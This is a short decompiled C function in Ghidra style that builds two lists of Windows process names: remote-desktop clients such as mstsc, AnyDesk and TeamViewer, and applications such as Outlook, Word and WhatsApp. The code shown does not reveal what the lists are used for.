
void FUN_140318450(void)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar2 = FUN_14079d0b0(&DAT_140ec4c78,9);
  *(undefined ***)(lVar2 + 0x10) = &PTR_DAT_1411ad9a8/*"vncviewer"*/;
  *(undefined ***)(lVar2 + 0x18) = &PTR_DAT_1411ac310/*"tvnviewer"*/;
  *(undefined ***)(lVar2 + 0x20) = &PTR_DAT_1411a2ad8/*"mstsc"*/;
  *(undefined ***)(lVar2 + 0x28) = &PTR_DAT_1411a2a40/*"msrdc"*/;
  *(undefined ***)(lVar2 + 0x30) = &PTR_DAT_1411adc40/*"wfica32"*/;
  *(undefined ***)(lVar2 + 0x38) = &PTR_DAT_1411ad978/*"vmware-view"*/;
  *(undefined ***)(lVar2 + 0x40) = &PTR_DAT_1411a6760/*"rdcman"*/;
  *(undefined ***)(lVar2 + 0x48) = &PTR_DAT_141193c58/*"anydesk"*/;
  *(undefined ***)(lVar2 + 0x50) = &PTR_DAT_1411aad90/*"teamviewer"*/;
  if (PTR_FUN_1411d04f0 != (undefined *)0x0) {
    FUN_140773396();
  }
  lVar1 = DAT_1411d71f8;
  FUN_14079d180(DAT_1411d71f8 + 8,lVar2);
  lVar2 = FUN_14079d0b0(&DAT_140ec4c78,4);
  *(undefined ***)(lVar2 + 0x10) = &PTR_DAT_14115e3b0/*"OUTLOOK"*/;
  *(undefined ***)(lVar2 + 0x18) = &PTR_DAT_1411a4338/*"olk"*/;
  *(undefined ***)(lVar2 + 0x20) = &PTR_DAT_14118d6e8/*"WINWORD"*/;
  *(undefined ***)(lVar2 + 0x28) = &PTR_DAT_14118dc00/*"WhatsApp"*/;
  FUN_14079d180(lVar1 + 0x10,lVar2);
  return;
}

